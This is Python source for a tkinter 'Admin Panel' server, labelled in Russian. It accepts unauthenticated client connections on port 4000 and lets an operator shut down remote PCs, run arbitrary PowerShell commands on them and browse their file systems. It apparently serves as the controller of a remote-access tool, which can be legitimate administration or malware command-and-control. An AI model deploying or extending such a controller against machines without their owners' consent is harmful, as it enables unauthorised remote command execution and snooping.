import os
import socket
import threading
import tkinter as tk
from tkinter import ttk, messagebox


class ServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Admin Panel - Clients Monitor")

        self.tree = ttk.Treeview(root, columns=("IP", "Status"), show='headings')
        self.tree.heading("IP", text="IP Адрес")
        self.tree.heading("Status", text="Статус")
        self.tree.pack(fill=tk.BOTH, expand=True)

        self.tree.bind("<Double-1>", self.on_double_click)

        self.btn_frame = tk.Frame(root)
        self.btn_frame.pack(fill=tk.X, pady=5)

        self.btn_shutdown = tk.Button(self.btn_frame, text="Выключить ПК", command=lambda: self.send_command("SHUTDOWN"))
        self.btn_shutdown.pack(side=tk.LEFT, padx=5)

        self.ps_args = tk.Entry(self.btn_frame, width=30)
        self.ps_args.insert(0, "-NoExit -Command \"Get-Process\"")
        self.ps_args.pack(side=tk.LEFT, padx=(20, 5))

        self.btn_ps = tk.Button(self.btn_frame, text="Запустить PowerShell", command=lambda: self.send_command("POWERSHELL"))
        self.btn_ps.pack(side=tk.LEFT, padx=5)

        self.btn_ps_exec = tk.Button(self.btn_frame, text="Запустить PS с аргументами", command=lambda: self.send_command(f"PS_EXEC:{self.ps_args.get()}"))
        self.btn_ps_exec.pack(side=tk.LEFT, padx=5)

        self.clients = {}
        self.active_connections = {}

        self.server_thread = threading.Thread(target=self.start_socket_server, daemon=True)
        self.server_thread.start()

    def start_socket_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('0.0.0.0', 4000))
        server.listen(5)

        while True:
            client_sock, addr = server.accept()
            client_id = f"{addr[0]}:{addr[1]}"

            self.active_connections[client_id] = client_sock
            self.update_status(client_id, "В сети (Online)")

            threading.Thread(target=self.monitor_client, args=(client_sock, client_id), daemon=True).start()

    def monitor_client(self, sock, client_id):
        try:
            while True:
                data = sock.recv(1024)
                if not data: break

                decoded_data = data.decode('utf-8')
                if decoded_data.startswith("DIR_DATA:"):
                    raw_payload = decoded_data[9:]
                    current_path, files_str = raw_payload.split("||")
                    files_list = files_str.split("|")
                    self.root.after(0, self.show_desktop_window, client_id, current_path, files_list)
        except:
            pass
        finally:
            if client_id in self.active_connections:
                del self.active_connections[client_id]
            self.update_status(client_id, "Оффлайн")
            sock.close()

    def on_double_click(self, event):
        selected = self.tree.selection()
        if not selected: return
        client_id = self.tree.item(selected[0])['values'][0]
        if client_id in self.active_connections:
            self.active_connections[client_id].send("LIST_DIR:".encode('utf-8'))

    def show_desktop_window(self, client_id, current_path, files_list):
        win = tk.Toplevel(self.root)
        win.title(f"Проводник: {client_id}")
        win.geometry("500x500")

        lbl = tk.Label(win, text=f"Шлях: {current_path}", fg="blue")
        lbl.pack(fill=tk.X)

        listbox = tk.Listbox(win)
        listbox.pack(fill=tk.BOTH, expand=True)

        for f in files_list:
            listbox.insert(tk.END, f)

        def open_item(event):
            selection = listbox.get(listbox.curselection())
            if selection.startswith("[DIR] "):
                folder_name = selection[6:]
                new_path = os.path.join(current_path, folder_name)
                self.active_connections[client_id].send(f"LIST_DIR:{new_path}".encode('utf-8'))
                win.destroy()

        listbox.bind("<Double-1>", open_item)

    def send_command(self, cmd):
        selected_item = self.tree.selection()
        if not selected_item:
            messagebox.showwarning("Внимание", "Сначала выберите клиента в списке!")
            return

        client_id = self.tree.item(selected_item[0])['values'][0]

        if client_id in self.active_connections:
            try:
                self.active_connections[client_id].send(cmd.encode('utf-8'))
                print(f"[>] Отправлено на {client_id}: {cmd}")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось отправить команду: {e}")
        else:
            messagebox.showerror("Ошибка", "Связь с клиентом потеряна")

    def update_status(self, ip, status):
        self.root.after(0, self._safe_update, ip, status)

    def _safe_update(self, ip, status):
        if ip in self.clients:
            self.tree.item(self.clients[ip], values=(ip, status))
        else:
            item_id = self.tree.insert("", tk.END, values=(ip, status))
            self.clients[ip] = item_id


if __name__ == "__main__":
    root = tk.Tk()
    app = ServerGUI(root)
    root.mainloop()